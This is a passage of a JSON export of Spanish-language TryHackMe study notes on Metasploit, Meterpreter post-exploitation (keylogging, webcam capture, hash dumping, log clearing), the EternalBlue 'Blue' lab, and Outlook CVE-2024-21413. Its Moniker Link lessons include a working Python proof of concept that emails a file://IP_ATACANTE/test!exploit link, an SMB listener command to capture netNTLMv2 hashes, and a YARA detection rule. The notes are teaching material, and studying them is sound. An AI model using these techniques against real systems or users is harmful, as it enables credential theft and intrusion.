Netgear R6700v3 Unauthenticated LAN Admin Password Reset\n   2   auxiliary/dos/cisco/ios_telnet_rocem                2017-03-17       normal  No     Cisco IOS Telnet Denial of Service\n   3   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger\n   4   auxiliary/scanner/ssh/juniper_backdoor              2015-12-20       normal  No     Juniper SSH Backdoor Scanner\n   5   auxiliary/scanner/telnet/brocade_enable_login                        normal  No     Brocade Enable Login Check Scanner\n   6   auxiliary/scanner/telnet/lantronix_telnet_password                   normal  No     Lantronix Telnet Password Recovery\n   7   auxiliary/scanner/telnet/lantronix_telnet_version                    normal  No     Lantronix Telnet Service Banner Detection\n   8   auxiliary/scanner/telnet/satel_cmd_exec             2017-04-07       normal  No     Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability\n   9   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal  No     Telnet Service Encryption Key ID Overflow Detection\n   10  auxiliary/scanner/telnet/telnet_login                                normal  No     Telnet Login Check Scanner\n   11  auxiliary/scanner/telnet/telnet_ruggedcom                            normal  No     RuggedCom Telnet Password Generator\n   12  auxiliary/scanner/telnet/telnet_version                              normal  No     Telnet Service Banner Detection\n   13  auxiliary/server/capture/telnet                                      normal  No     Authentication Capture: Telnet\n\n\nInteract with a module by name or index, for example use 13 or use auxiliary/server/capture/telnet\n\nmsf6 >\n```\n\nRecuerda que los exploits se aprovechan de vulnerabilidades en el equipo objetivo, y que por lo tanto, un exploit calificado como bajo puede funcionar mientras que uno calificado como alto puede no funcionar o incluso colapsar el sistema.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Meterpreter",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/1-introduction-to-meterpreter/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/1. Introduction to Meterpreter.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Meterpreter es un payload de Metasploit que soporta el proceso de pentesting con varios componentes de valor. Meterpreter correr√° en el sistema v√≠ctima y actuar√° como un agente en un \"command and control\".\n\n-------------------\n<h2>¬øC√≥mo funciona Meterfreter</h2>\nMeterpreter se ejecuta en el sistema objetivo pero no est√° instalado all√≠. Corre en memoria (RAM) y no se escribe en el disco (con el objetivo de no ser detectado por los escaneos de antivirus). De esta manera es visto tan s√≥lo como un proceso.\n\nMeterpreter tambi√©n intenta evitar ser detectado por IPSs (Intrusion Prevention System) basados en red e IDSs (Intrusion Detection System) usando comunicaci√≥n encriptada con el servidor. Si el sistema objetivo no desencripta y revisa este tr√°fico, estas soluciones no podr√°n detectar su actividad.\n\nAunque Meterpreter es reconocido por la mayor√≠a de software de antivirus, esta funcionalidad presenta cierto sigilo. De hecho, como es un proceso tiene un PID, pero si miramos el nombre bajo ese PID en la m√°quina objetivo no veremos meterpreter por ning√∫n lado, sino `spoolsv.exe`. Incluso si vamos m√°s all√° y comprobamos las DLLs (Dynamic-Link Libraries), no veremos ning√∫n `meterpreter.dll`.\n\n>[!NOTE] Meterpreter establecer√° un canal de comunicaci√≥n encriptada (TLS) con el sistema atacante.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Meterpreter Commands",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/3-meterpreter-commands/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/3. Meterpreter Commands.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Al usar `help` en una sesi√≥n de Meterpreter, se nos mostrar√°n los comandos disponibles. Cada versi√≥n de Meterpreter tendr√° unos comandos u otros, por lo que ejecutar `help` siempre es una buena idea. Meterpreter tiene tres opciones:\n\n- Comandos.\n- Herramientas.\n- Scripting.\n\nSi usas `help`, ver√°s que los comandos de Meterpreter est√°n listados en diferentes categor√≠as:\n\n- Core commands\n- File system commands\n- Networking commands\n- System commands\n- User interface commands\n- Webcam commands\n- Audio output commands\n- Elevate commands\n- Password database commands\n- Timestomp commands\n\n>[!NOTE] Esta lista fue sacada de `windows/x64/meterpreter/reverse_tcp` y puede variar con las diferentes versiones.\n\n----------------------\n<h2>Comandos de Meterpreter</h2>\nLos core commands ser√°n √∫tiles para navegar e interactuar con el sistema objetivo. Debajo, algunos de los m√°s utilizados. Recuerda comprobar todos los comandos disponibles ejecutando el comando `help`una vez iniciada la sesi√≥n.\n\n<h5>Core commands</h5>\n- `background`: Pone la sesi√≥n actual en segundo plano.\n- `exit`: Termina la sesi√≥n de Meterpreter.\n- `guid`: Muestra el GUID (Global Unique Identifier).\n- `help`: Muestra el men√∫ de ayuda.\n- `info`: Muestra informaci√≥n sobre un m√≥dulo Post.\n- `irb`: Abre una shell de Ruby interactiva en la sesi√≥n actual.\n- `load`: Carga una o m√°s extensiones de Meterpreter.\n- `migrate`: Permite migrar Meterpreter a otro proceso.\n- `run`: Ejecuta el script de Meterpreter o el m√≥dulo Post.\n- `sessions`: Para cambiar r√°pidamente a otra sesi√≥n.\n\n<h5>File system commands</h5>\n- `cd`: Para cambiar el directorio.\n- `ls`: Para listar los archivos en el directorio actual.\n- `pwd`: Muestra el directorio actual.\n- `edit`: Permite editar un archivo.\n- `cat`: Muestra el contenido de un archivo por pantalla.\n- `rm`: Para borrar un archivo.\n- `search`: Para buscar archivos.\n- `upload`: Para subir un archivo.\n- `download`: Para descargar un archivo.\n\n<h5>Networking commands</h5>\n- `arp`: Muestra la cach√© del host ARP (Address Resolution Protocol).\n- `ifconfig`: Muestra las interfaces de red disponibles en el objetivo.\n- `netstat`: Muestra las conexiones de red.\n- `portfwd`: Redirige un puerto local a un servicio remoto.\n- `route`: Permite ver y modificar la tabla de ruta.\n\n<h5>System commands</h5>\n- `clearev`: Limpia los logs de evento.\n- `execute`: Ejecuta un comando.\n- `getpid`: Muestra el identificador de proceso actual.\n- `getuid`: Muestra el usuario como el cual Meterpreter est√° corriendo.\n- `kill`: Termina un proceso.\n- `pkill`: Termina un proceso por nombre.\n- `ps`: Lista los procesos activos.\n- `reboot`: Reinicia el ordenador remoto.\n- `shell`: Muestra una linea de comanos del sistema.\n- `shutdown`: Apaga el equipo remoto.\n- `sysinfo`: Recoge y muestra informaci√≥n sobre el sistema remoto.\n\n<h5>Other Commands</h5>\n- `idletime`: Devuelve el n√∫mero de segundos que el usuario remoto ha estado ausente.\n- `keyscan_dump`: Muestra el keystroke buffer (area de memoria que guarda temporalmente las teclas presionadas).\n- `keyscan_start`: Empieza a capturar teclas presionadas.\n- `keyscan_stop`: Para de capturar teclas presionadas.\n- `screenshare`: Permite ver la pantalla del usuario remoto en tiempo real.\n- `screenshot`: Toma una captura de pantalla del usuario remoto.\n- `record_mic`: Graba sonido del micr√≥fono por defecto durante X segundos.\n- `webcam_chat`: Comienza un chat de video.\n- `webcam_list`: Lista webcams.\n- `webcam_snap`: Toma una foto de la c√°mara especificada.\n- `webcam_stream`: Muestra un canal de video de la c√°mara especificada.\n- `getsystem`: Intenta elevar tus privilegios.\n- `hashdump`: Muestra el contenido de la base de datos SAM.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Post-Exploitation Challenge",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/5-post-exploitation-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/5. Post-Exploitation Challenge.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Los comandos antes mencionados como `getsystem` y `hashdump` proporcionar√°n informaci√≥n relevante para la escalada de privilegios y el movimiento lateral.\n\nLa fase de post explotaci√≥n tendr√° vaios objetivos y Meterpreter tiene funciones que pueden asistirnos en todos ellos:\n\n- Recopilar informaci√≥n sobre el sistema.\n- Buscar archivos interesantes, credenciales, etc.\n- Escalar privilegios.\n- Movimiento lateral.\n\nUna vez que las herramientas extra hayan sido cargadas con el comando `load`, veremos opciones en el men√∫ `help`.\n\nUsa ` exploit/windows/smb/psexec`\n\nUsuario: `ballen`\nContrase√±a: `Password1`\n\n--------------------------\n\n![[Pasted image 20250923094940.png]]\n\n1. What is the computer name?\n   ![[Pasted image 20250923095101.png]]\n   \n2. What is the target domain?\n   ![[Pasted image 20250923095255.png]]\n   \n3. What is the name of the share likely created by the user?\n   ![[Pasted image 20250923095439.png]]\n   \n4. What is the NTLM hash of the jchambers user?\n   ![[Pasted image 20250923095549.png]]\n   \n5. What is the cleartext password of the jchambers user?\n   ![[Pasted image 20250923095716.png]]\n   \n6. Where is the \"secrets.txt\"  file located? (Full path of the file)\n   ![[Pasted image 20250923100507.png]]\n   \n7. What is the Twitter password revealed in the \"secrets.txt\" file?\n   ![[Pasted image 20250923100535.png]]\n   \n8. Where is the \"realsecret.txt\" file located? (Full path of the file)\n   ![[Pasted image 20250923100828.png]]\n   \n9. What is the real secret? \n   \n   ![[Pasted image 20250923100804.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Meterpreter Flavors",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/2-meterpreter-flavors/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/2. Meterpreter Flavors.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Como ya hemos visto en lecciones anteriores, los payloads de metasploit pueden ser divididos en dos categor√≠as, inline (o single) y staged.\n\nLos payloads staged son mandados al objetivo en dos pasos. La primera parte es instalada (el stager) que pide el resto del payload. Los payloads inline son mandados en un solo paso. Los payloads de Meterpreter se dividen en la misma clasificaci√≥n. Meterpreter, sin embargo tiene diferentes payloads en concordancia al sistema objetivo, para verlos: `msfvenom --list payloads | grep meterpreter`.\n\nLa decisi√≥n de qu√© versi√≥n de Meterpreter usar estar√° basada en tres cosas principalmente:\n\n- El sistema operativo que usa el sistema objetivo.\n- Los componentes disponibles en el sistema objetivo.\n- El tipo de conexi√≥n que puedas establecer con el sistema objetivo.\n\nAlgunos exploits tienen un payload autoconfigurado, como `ms17_010_eternalblue`. Tambi√©n puedes listar todos los payloads disponibles usando `show payloads`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Post-Exploitation with Meterpreter",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/4-post-exploitation-with-meterpreter/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/4. Post-Exploitation with Meterpreter.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Meterpreter te ofrece varios comandos √∫tiles que facilitan la post explotaci√≥n.\n\n--------------\n<h5>Help</h5>\nEste comando te da una lista de comandos disponibles en Meterpreter.\n\n<h5>Meterpreter Commands</h5>\nEl comando `getuid` muestra el usuario con el cual Meterpreter est√° corriendo. El comando `ps` listar√° todos los procesos. La lista de PID tambi√©n te dar√° informaci√≥n necesaria para migrar el proceso.\n\n<h5>Migrate</h5>\nMigrar a otro proceso sirve para interactuar con el. Por ejemplo si ves un procesador de palabras (como notepad.exe o word.exe) puedes migrar hacia √©l para empezar a capturar las teclas que son presionadas con comandos como `key_start`, `key_stop` y `key_dump`.\n\nPara migrar hacia otro proceso tienes que escribir: `migrate <new_process_PID>`.\n\n>[!CAUTION] Puedes perder tus privilegios si migras desde un proceso con m√°s privilegios.\n\n<h5>Hashdump</h5>\nListar√° el contenido de la base de datos SAM. Las contrase√±as de SAM se guardan en formato NTLM.\n\n<h5>Search</h5>\nEl comando `search` es √∫til para localizar archivos.\n\n<h5>Shell</h5>\nLanzar√° una shell en el sistema objetivo, pulsar `CTRL + Z` te devolver√° a la shell de Meterpreter.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Metasploit - Meterpreter",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/0-metasploit-meterpreter/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/0. Metasploit - Meterpreter.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "[[1. Introduction to Meterpreter]]\n[[2. Meterpreter Flavors]]\n[[3. Meterpreter Commands]]\n[[4. Post-Exploitation with Meterpreter]]\n[[5. Post-Exploitation Challenge]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Cracking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/4-cracking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/4. Cracking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?¬†\n   ![[Pasted image 20250924160624.png]]\n   \n2. Copy this password hash to a file and research how to crack it. What is the cracked password?\n   ![[Pasted image 20250924160709.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Blue",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/0-blue/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/0. Blue.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "[[1. Recon]]\n[[2. Gain Access]]\n[[3. Escalate]]\n[[4. Cracking]]\n[[5. Find flags!]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Recon",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/1-recon/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/1. Recon.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "Escanea la m√°quina.\n\n![[Pasted image 20250924152127.png]]\n\n1. How many ports are open with a port number under 1000?\n   3\n   \n2. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)\n   ![[Pasted image 20250924152627.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Find flags!",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/5-find-flags/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/5. Find flags!.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "![[Pasted image 20250924160902.png]]\n\n1. Flag1? _This flag can be found at the system root._¬†\n   ![[Pasted image 20250924160954.png]]\n\n2. Flag2? _This flag can be found at the location where passwords are stored within Windows._\n   ![[Pasted image 20250924161046.png]]\n\n  \n\n*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.¬†\n\n3. flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._\n   ![[Pasted image 20250924161247.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Gain Access",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/2-gain-access/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/2. Gain Access.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "1. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)\n   ![[Pasted image 20250924152941.png]]\n2. Show options and set the one required value. What is the name of this value? (All caps for submission)\n   ![[Pasted image 20250924153208.png]]\n3. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:\n   \n   `set payload windows/x64/shell/reverse_tcp`\n   ![[Pasted image 20250924154024.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Escalate",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/3-escalate/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/3. Escalate.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)¬†\n   ![[Pasted image 20250924154252.png]]\n\n2. Select this (use MODULE_PATH). Show options, what option are we required to change?\n   ![[Pasted image 20250924154451.png]]\n\n3. Once the meterpreter shell conversion completes, select that session for use.\n   ![[Pasted image 20250924154707.png]]\n\n4. Verify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.¬†\n   ![[Pasted image 20250924154810.png]]\n\n5. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column).\n   ![[Pasted image 20250924160451.png]]\n\n6. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time\n   ![[Pasted image 20250924160536.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Moniker Link (CVE-2024-21413)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/2-moniker-link-cve-2024-21413/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/2. Moniker Link (CVE-2024-21413).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "Outlook puede renderizar emails como HTML. Adem√°s, Outlook puede parsear hiperlinks como HTTP y HTTPS. De cualquier forma, tambi√©n puede abrir enlaces especificando aplicaciones, conocido como Moniker Links. Normalmente, Outlook lanza un mensaje de riesgo de seguridad cuando se disparan aplicaciones externas.\n\n![[134.jpg]]\n\nEste pop-up es el resultado del modo \"Vista Protegida\" de Outlook. Este modo abre emails que contienen archivos adjuntos, hiperlinks y dem√°s en modo de s√≥lo lectura, bloqueando cosas como las macros.\n\nAl usar `file://` en el moniker link podemos decirle a Outlook que acceda a un archivo, como uno en la red compartida (`a href=\"file://IP_ATACANTE/test>Click me</a>`). El protocolo SMB es usado, lo que implica usar credenciales locales para autentificaci√≥n. Sin embargo, el modo \"vista protegida\" atrapa y bloquea este intento.\n\n```html\n<p><a href=\"file://IP_ATACANTE/test\">Click me</a></p>\n```\n\nLa vulnerabilidad aqu√≠ existe al modificar el hiperenlace para incluir el car√°cter especial `!`, lo que resulta en el bypass del modo protegido de Outlook.\n\n```html\n<p><a href=\"file://IP_ATACANTE/test!exploit\">Click me</a></p>\n```\n\nComo atacantes podemos ofrecer este link para el ataque. La compartici√≥n no tiene por qu√© existir en el dispositivo remoto. La ejecuci√≥n remota de comandos (RCE) es posible porque el Moniker Link usa el modelo de objetos componentes (COM).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "El 13 de febrero de 2024, Microsoft Outlook anunci√≥ una vulnerabilidad de brecha de credenciales (Moniker Link). Esta bypasseaba las medidas de seguridad de Outlook al manejar un tipo de hiperlink llamado Moniker Link. Un atacante pod√≠a abusar de esto para obtener las credenciales NTLM una vez hecho click.\n\n| **CVSS**          | **Description**                                                                                                                                          |\n| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Publish date      | February 13th, 2024                                                                                                                                      |\n| MS article        | [https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413) |\n| Impact            | Remote Code Execution & Credential Leak                                                                                                                  |\n| Severity          | Critical                                                                                                                                                 |\n| Attack Complexity | Low                                                                                                                                                      |\n| Scoring           | 9.8                                                                                                                                                      |\n\nLa vulnerabilidad afecta a:\n\n| **Release**                       | **Version**                                |\n| --------------------------------- | ------------------------------------------ |\n| Microsoft Office LTSC 2021        | affected from 19.0.0                       |\n| Microsoft 365 Apps for Enterprise | affected from 16.0.1                       |\n| Microsoft Office 2019             | affected from 16.0.1                       |\n| Microsoft Office 2016             | affected from 16.0.0 before 16.0.5435.1001 |\n\n-------------------\n<h2>Objetivos de Aprendizaje</h2>\n- C√≥mo funciona la vulnerabilidad.\n- Comprender el modo \"Vista Protegida\" de Outlook.\n- Usar la vulnerabilidad para filtrar credenciales de un cliente.\n- Medidas de detecci√≥n y mitigaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Remediation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/5-remediation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/5. Remediation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "Microsoft ha incluido parches para resolver esta vulnerabilidad en la \"patch Tuesday release\" de Febrero. Actualizar Windows est√° altamente aconsejado.\n\nAlgunas recomendaciones para usuarios:\n\n- No hacer click en enlaces random.\n- Previsualizar links antes de hacer click en ellos.\n- Reenviar los emails sospechosos al departamento de cierseguridad.\n\nNo se puede reconfigurar Outlook para que no le afecte esta vulnerabilidad. Adem√°s, no se puede capar el protocolo SMB ya que es necesario para las comparticiones por red.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Detection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/4-detection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/4. Detection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "<h2>YARA</h2>\nUna regla Yara ha sido creada por Florian Roth para detectar emails que contienen el elemento `file:\\\\` en el link moniker.\n\n```python\nrule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {\n\n   meta:\n\n      description = \"Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook\"\n\n      author = \"X__Junior, Florian Roth\"\n\n      reference = \"https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/\"\n\n      date = \"2024-02-17\"\n\n      modified = \"2024-02-19\"\n\n      score = 75\n\n   strings:\n\n      $a1 = \"Subject: \"\n\n      $a2 = \"Received: \"\n\n\n\n      $xr1 = /file:\\/\\/\\/\\\\\\\\[^\"']{6,600}\\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/\n\n   condition:\n\n      filesize < 1000KB\n\n      and all of ($a*)\n\n      and 1 of ($xr*)\n\n}\n```\n\n----------------\n<h2>Wireshark</h2>\nAdem√°s, la petici√≥n SMB de la v√≠ctima al cliente puede ser vista en una captura de paquetes con un hash netNTLMv2 truncado.\n\n![[135.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Exploitation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/3-exploitation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/3. Exploitation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "Para este ataque, mandaremos un email a nuestra v√≠ctima con un Moniker Link similar al visto en la lecci√≥n anterior. El objetivo, como atacante, es hacer un email con un link moniker que bypassee la vista protegida de Outlook. donde el cliente de la v√≠ctima intente cargar un archivo de nuestra m√°quina de atacante, resultando en la captura del hash netNTLMv2.\n\nPero antes de comenzar, veremos una prueba de concepto.\n\n```python\n'''\nAuthor: CMNatic | https://github.com/cmnatic\nVersion: 1.0 | 119/02/2024\n'''\n\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.utils import formataddr\n\nsender_email = 'attacker@monikerlink.thm' #Reemplazar con el email del emisor\nreceiver_email = 'victim@monikerlink.thm' #Reemplazar con el email del receptor\npassword = input(\"Introduce la contrase√±a del email atacante: \")\nhtml_content = \"\"\"\\\n<!DOCTYPE html>\n<html lang=\"es\">\n\t<body>\n\t\t<p>Haz click<a href=\"file://IP_ATACANTE/test!exploit\">aqu√≠</a></p>\n\t</body>\n</html>\n\"\"\"\n\nmessage = MIMEMultipart()\nmessage['Subject'] = \"CVE-2024-21413\"\nmessage[\"From\"] = formataddr(('CMNatic', sender_email))\nmessage[\"To\"] = receiver_email\n\n#Convierte la string HTML a bytes y lo adjunta al objeto del mensaje\nmsgHtml = MIMEText(html_content, 'html')\nmessage.attach(msgHtml)\n\nserver = smtplib.SMTP('MAILSERVER', 25)\nserver.ehlo()\ntry:\n\tserver.login(sender_email, password)\nexcept Exception as err:\n\tprint(err)\n\texit(-1)\n\ntry:\n\tserver.sendmail(sender_email, [receiver_email], message.as_string())\n\tprint(\"\\n Email delivered\")\nexcept Exception as error:\n\tprint(error)\nfinally:\n\tserver.quit()\n```\n\nLo que hace:\n\n- Coge el email del atacante y de la v√≠ctima.\n- Pide la contrase√±a para autentificar.\n- Contiene el contenido del email (html_content), que contiene el link moniker.\n- Rellena los campos Asunto, De y Para.\n- Finalmente manda el email\n\nVamos a usar Responder para crear un escuchador SMB en nuestra m√°quina atacante. Para la AttackBox THM, la interfaz ser√° `-I ens5`. El nombre de la interfaz cambiar√° si lo hacemos en nuestro propio dispositivo.\n\nAbrimos la m√°quina virtual v√≠a RDP con las credenciales correspondientes:\n\n`xfreerdp3 /u:<usuario> /p:<contrase√±a> /v:<IP>`\n\nAbrimos Outlook en el escritorio remoto. Una vez abierto hacemos click en \"No quiero iniciar sesi√≥n o crear una cuenta\".\n\nEn el segundo pop up le damos a la \"X\" para salir.\n\nEn la siguiente ventana veremos la interfaz de Outlook de la v√≠ctima, que ya ha sido configurada.\n\nCopiamos y pegamos el c√≥digo de la PoC (Proof of Concept) en la m√°quina atacante.\n\nNecesitaremos hacer un par de cambios en el documento antes de ejecutarlo:\n\n- Cambiar la IP del atacante en la linea 12 a nuestra IP atacante.\n- Cambiar el placeholder de MAILSERVER en la linea 31 con la IP de la v√≠ctima.\n\nCuando nos pregunten por la contrase√±a del correo atacante introducimos `attacker`.\n\nAl hacer esto nos debe llegar un correo con un enlace.\n\nSi en la m√°quina atacante preparamos un impacket (porque responder no funciona bien en nuestra kali), con: `sudo impacket-smbserver test /home/user/smbshare -smb2support -port 1445`. Al hacer click en el enlace nos aparecer√° el nombre de usuario y el hash de autentificaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Moniker Link (CVE-2024-21413)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/0-moniker-link-cve-2024-21413/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/0. Moniker Link (CVE-2024-21413).md",
